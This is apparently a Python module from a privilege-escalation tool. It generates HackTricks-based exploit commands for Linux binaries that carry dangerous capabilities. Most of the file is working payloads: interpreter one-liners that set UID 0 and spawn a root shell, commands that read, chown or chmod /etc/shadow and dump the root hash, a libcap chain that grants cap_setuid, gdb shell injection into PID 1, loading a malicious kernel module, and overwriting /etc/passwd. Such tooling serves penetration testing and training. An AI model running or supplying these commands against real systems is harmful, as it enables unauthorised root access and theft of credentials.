"""
Capability privilege-escalation knowledge based on HackTricks.

Reference: https://hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html
"""

from __future__ import annotations

from binsuid.models import Technique, VectorType
from binsuid.utils import capability_matches, normalize_executable_name

HACKTRICKS_BASE = (
    "https://hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html"
)

CSP_LESSON_URL = (
    "https://github.com/cybersecplayground/30-Day-Linux-for-Hackers/blob/main/"
    "21_Linux_Capabilities_and_Exploitation.md"
)

# Dangerous capabilities for privesc (HackTricks + capability.h).
DANGEROUS_CAPS: dict[str, dict] = {
    "CAP_SETUID": {
        "severity": "critical",
        "summary": "Set effective UID — trivial root via interpreters",
        "anchor": "cap_setuid",
    },
    "CAP_SETFCAP": {
        "severity": "critical",
        "summary": "Assign file capabilities — grant CAP_SETUID to a binary",
        "anchor": "cap_setfcap",
    },
    "CAP_SYS_ADMIN": {
        "severity": "high",
        "summary": "Near-root admin ops (mount, namespaces, kernel tunables)",
        "anchor": "cap_sys_admin",
    },
    "CAP_SYS_MODULE": {
        "severity": "high",
        "summary": "Load/unload kernel modules",
        "anchor": "cap_sys_module",
    },
    "CAP_SYS_PTRACE": {
        "severity": "high",
        "summary": "Debug/inject into processes (bypass restrictions)",
        "anchor": "cap_sys_ptrace",
    },
    "CAP_DAC_OVERRIDE": {
        "severity": "high",
        "summary": "Bypass file read/write permission checks",
        "anchor": "cap_dac_override",
    },
    "CAP_DAC_READ_SEARCH": {
        "severity": "high",
        "summary": "Bypass file/directory read checks (read shadow, docker breakout)",
        "anchor": "cap_dac_read_search",
    },
    "CAP_SETGID": {
        "severity": "high",
        "summary": "Set effective GID — impersonate privileged groups (shadow, docker)",
        "anchor": "cap_setgid",
    },
    "CAP_CHOWN": {
        "severity": "high",
        "summary": "Change ownership of any file",
        "anchor": "cap_chown",
    },
    "CAP_FOWNER": {
        "severity": "high",
        "summary": "Change permissions of any file",
        "anchor": "cap_fowner",
    },
    "CAP_FSETID": {
        "severity": "medium",
        "summary": "Set setuid/setgid bits on files",
        "anchor": "cap_fsetid",
    },
    "CAP_SYS_CHROOT": {
        "severity": "medium",
        "summary": "Use chroot(2)",
        "anchor": "cap_sys_chroot",
    },
    "CAP_SYS_RAWIO": {
        "severity": "medium",
        "summary": "Raw I/O and sensitive device access",
        "anchor": "cap_sys_rawio",
    },
    "CAP_SETPCAP": {
        "severity": "medium",
        "summary": "Modify process capability sets",
        "anchor": "cap_setpcap",
    },
    "CAP_NET_RAW": {
        "severity": "low",
        "summary": "Raw sockets (sniffing, not direct root)",
        "anchor": None,
    },
    "CAP_NET_ADMIN": {
        "severity": "low",
        "summary": "Network administration (sniffing, routing)",
        "anchor": None,
    },
    "CAP_NET_BIND_SERVICE": {
        "severity": "medium",
        "summary": "Bind privileged ports (<1024) without root — backdoor foothold",
        "anchor": None,
    },
}

INTERESTING_CAPS = frozenset(DANGEROUS_CAPS.keys())

SEVERITY_ORDER = ("critical", "high", "medium", "low")


def hacktricks_url(anchor: str | None) -> str:
    if not anchor:
        return HACKTRICKS_BASE
    return f"{HACKTRICKS_BASE}#{anchor}"


def severity_for_caps(caps: list[str]) -> str:
    best = "low"
    for cap in caps:
        meta = DANGEROUS_CAPS.get(cap.upper(), {})
        sev = meta.get("severity", "low")
        if SEVERITY_ORDER.index(sev) < SEVERITY_ORDER.index(best):
            best = sev
    return best


def interpreter_family(path: str) -> str | None:
    name = normalize_executable_name(path).lower()
    if name.startswith("python"):
        return "python"
    for family in ("ruby", "perl", "lua", "node", "php"):
        if name == family or name.startswith(family):
            return family
    return None


def _technique(
    *,
    executable: str,
    function: str,
    code: str,
    description: str,
    caps: list[str],
    anchor: str | None,
    source: str = "hacktricks",
    url: str | None = None,
) -> Technique:
    if url is None:
        url = hacktricks_url(anchor) if source == "hacktricks" else CSP_LESSON_URL
    return Technique(
        executable=executable,
        function=function,
        code=code,
        context=VectorType.CAPABILITIES.value,
        description=description,
        capability_requirements=caps,
        metadata={"source": source},
        gtfobins_url=url,
    )


def _python_setuid(bin_path: str) -> str:
    return f'{bin_path} -c \'import os; os.setuid(0); os.system("/bin/sh")\''


def _python_setgid(bin_path: str) -> str:
    return (
        f'{bin_path} -c \'import os; os.setgid(42); os.system("/bin/sh")\'  '
        "# replace 42 with target GID (e.g. shadow/docker)"
    )


def _python_read_shadow(bin_path: str) -> str:
    return f'{bin_path} -c \'print(open("/etc/shadow").read())\''


def _python_chown_shadow(bin_path: str) -> str:
    return (
        f'{bin_path} -c \'import os; os.chown("/etc/shadow", 1000, 42)\'  '
        "# replace UID/GID with your user and shadow group"
    )


def _python_chmod_shadow(bin_path: str) -> str:
    return f'{bin_path} -c \'import os; os.chmod("/etc/shadow", 0o666)\''


def _python_setfcap_chain(bin_path: str) -> str:
    return (
        f"# Step 1: grant CAP_SETUID to the binary\n"
        f'{bin_path} -c \'import ctypes,sys; l=ctypes.cdll.LoadLibrary("libcap.so.2"); '
        f'l.cap_from_text.argtypes=[ctypes.c_char_p]; l.cap_from_text.restype=ctypes.c_void_p; '
        f'l.cap_set_file.argtypes=[ctypes.c_char_p,ctypes.c_void_p]; '
        f't=sys.argv[1].encode(); c=l.cap_from_text(b"cap_setuid+ep"); l.cap_set_file(t,c)\' '
        f'"{bin_path}"\n'
        f"# Step 2: escalate\n"
        f'{bin_path} -c \'import os; os.setuid(0); os.system("/bin/sh")\''
    )


def _ruby_setuid(bin_path: str) -> str:
    return f'{bin_path} -e \'Process::Sys.setuid(0); exec "/bin/sh"\''


def _perl_setuid(bin_path: str) -> str:
    return f"{bin_path} -e 'use POSIX; setuid(0); exec \"/bin/sh\"'"


INTERPRETER_SETUID = {
    "python": _python_setuid,
    "ruby": _ruby_setuid,
    "perl": _perl_setuid,
}

INTERPRETER_SETGID = {
    "python": _python_setgid,
}

INTERPRETER_READ = {
    "python": _python_read_shadow,
}

INTERPRETER_CHOWN = {
    "python": _python_chown_shadow,
}

INTERPRETER_CHMOD = {
    "python": _python_chmod_shadow,
}


def techniques_for_capability_finding(
    path: str,
    caps: list[str],
    *,
    executable_key: str | None = None,
) -> list[Technique]:
    """Generate HackTricks-style techniques for a capability finding."""
    techniques: list[Technique] = []
    cap_set = {c.upper() for c in caps}
    family = interpreter_family(path)
    key = executable_key or normalize_executable_name(path)
    present = list(cap_set)

    if "CAP_SETUID" in cap_set and family and family in INTERPRETER_SETUID:
        meta = DANGEROUS_CAPS["CAP_SETUID"]
        techniques.append(
            _technique(
                executable=key,
                function="privilege-escalation",
                code=INTERPRETER_SETUID[family](path),
                description=meta["summary"],
                caps=["CAP_SETUID"],
                anchor=meta["anchor"],
            )
        )

    if "CAP_SETGID" in cap_set and family and family in INTERPRETER_SETGID:
        meta = DANGEROUS_CAPS["CAP_SETGID"]
        techniques.append(
            _technique(
                executable=key,
                function="privilege-escalation",
                code=INTERPRETER_SETGID[family](path),
                description=meta["summary"],
                caps=["CAP_SETGID"],
                anchor=meta["anchor"],
            )
        )

    if "CAP_DAC_READ_SEARCH" in cap_set and family and family in INTERPRETER_READ:
        meta = DANGEROUS_CAPS["CAP_DAC_READ_SEARCH"]
        techniques.append(
            _technique(
                executable=key,
                function="file-read",
                code=INTERPRETER_READ[family](path),
                description="Read /etc/shadow bypassing DAC (then crack hashes)",
                caps=["CAP_DAC_READ_SEARCH"],
                anchor=meta["anchor"],
            )
        )

    if "CAP_CHOWN" in cap_set and family and family in INTERPRETER_CHOWN:
        meta = DANGEROUS_CAPS["CAP_CHOWN"]
        techniques.append(
            _technique(
                executable=key,
                function="privilege-escalation",
                code=INTERPRETER_CHOWN[family](path),
                description=meta["summary"],
                caps=["CAP_CHOWN"],
                anchor=meta["anchor"],
            )
        )

    if "CAP_FOWNER" in cap_set and family and family in INTERPRETER_CHMOD:
        meta = DANGEROUS_CAPS["CAP_FOWNER"]
        techniques.append(
            _technique(
                executable=key,
                function="privilege-escalation",
                code=INTERPRETER_CHMOD[family](path),
                description=meta["summary"],
                caps=["CAP_FOWNER"],
                anchor=meta["anchor"],
            )
        )

    if capability_matches(["CAP_SETGID", "CAP_CHOWN"], present) and family == "python":
        techniques.append(
            _technique(
                executable=key,
                function="privilege-escalation",
                code=f"""{path} <<'PY'
import os
LAB_UID = 1000      # your uid
SHADOW_GID = 42     # getent group shadow

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
PY""",
                description="CAP_SETGID + CAP_CHOWN chain to read root hash (HackTricks)",
                caps=["CAP_SETGID", "CAP_CHOWN"],
                anchor="cap_setgid",
            )
        )

    if "CAP_SETFCAP" in cap_set and family == "python":
        meta = DANGEROUS_CAPS["CAP_SETFCAP"]
        techniques.append(
            _technique(
                executable=key,
                function="privilege-escalation",
                code=_python_setfcap_chain(path),
                description=meta["summary"],
                caps=["CAP_SETFCAP"],
                anchor=meta["anchor"],
            )
        )

    if "CAP_SYS_PTRACE" in cap_set and key in {"gdb", "gdb-multiarch", "lldb"}:
        meta = DANGEROUS_CAPS["CAP_SYS_PTRACE"]
        techniques.append(
            _technique(
                executable=key,
                function="privilege-escalation",
                code=f"{path} -p 1 -batch -ex 'call system(\"/bin/sh\")'",
                description="Inject shell into PID 1 (adjust target PID as needed)",
                caps=["CAP_SYS_PTRACE"],
                anchor=meta["anchor"],
            )
        )

    if "CAP_SYS_MODULE" in cap_set and key in {"kmod", "insmod", "modprobe"}:
        meta = DANGEROUS_CAPS["CAP_SYS_MODULE"]
        techniques.append(
            _technique(
                executable=key,
                function="privilege-escalation",
                code=f"# Load a rootkit/LKM — see HackTricks CAP_SYS_MODULE section\n{path} malicious.ko",
                description=meta["summary"],
                caps=["CAP_SYS_MODULE"],
                anchor=meta["anchor"],
            )
        )

    if "CAP_DAC_OVERRIDE" in cap_set and key in {"vim", "vi", "nano", "ed"}:
        meta = DANGEROUS_CAPS["CAP_DAC_OVERRIDE"]
        techniques.append(
            _technique(
                executable=key,
                function="file-write",
                code=f'{path} -c \':w! /etc/passwd\'  # or append rogue user line',
                description="Overwrite privileged files bypassing DAC",
                caps=["CAP_DAC_OVERRIDE"],
                anchor=meta["anchor"],
            )
        )

    if "CAP_NET_BIND_SERVICE" in cap_set:
        meta = DANGEROUS_CAPS["CAP_NET_BIND_SERVICE"]
        techniques.append(
            _technique(
                executable=key,
                function="bind-service",
                code=(
                    f"# Can bind ports <1024 without root (Day 21 abuse pattern)\n"
                    f"{path} --listen 0.0.0.0:80  # replace with real bind syntax"
                ),
                description=meta["summary"],
                caps=["CAP_NET_BIND_SERVICE"],
                anchor=None,
                source="cybersecplayground",
            )
        )

    if capability_matches(["CAP_DAC_READ_SEARCH", "CAP_NET_ADMIN"], present):
        techniques.append(
            _technique(
                executable=key,
                function="manual-review",
                code=f"# Versatile combo on {path}: read bypass + network admin",
                description="Combined capabilities — review Day 21 attack scenarios",
                caps=["CAP_DAC_READ_SEARCH", "CAP_NET_ADMIN"],
                anchor=None,
                source="cybersecplayground",
            )
        )

    # Manual review pointer for dangerous caps without auto payload.
    uncovered = cap_set - {c for t in techniques for c in t.capability_requirements}
    for cap in sorted(uncovered):
        if cap not in DANGEROUS_CAPS:
            continue
        meta = DANGEROUS_CAPS[cap]
        if meta["severity"] in {"low"}:
            continue
        techniques.append(
            _technique(
                executable=key,
                function="manual-review",
                code=f"# Review HackTricks section for {cap} on {path}",
                description=f"{cap}: {meta['summary']} — manual exploitation required",
                caps=[cap],
                anchor=meta.get("anchor"),
            )
        )

    return _dedupe_techniques(techniques)


def _dedupe_techniques(techniques: list[Technique]) -> list[Technique]:
    seen: set[tuple[str, str]] = set()
    unique: list[Technique] = []
    for tech in techniques:
        key = (tech.function, tech.code.strip())
        if key in seen:
            continue
        seen.add(key)
        unique.append(tech)
    return unique
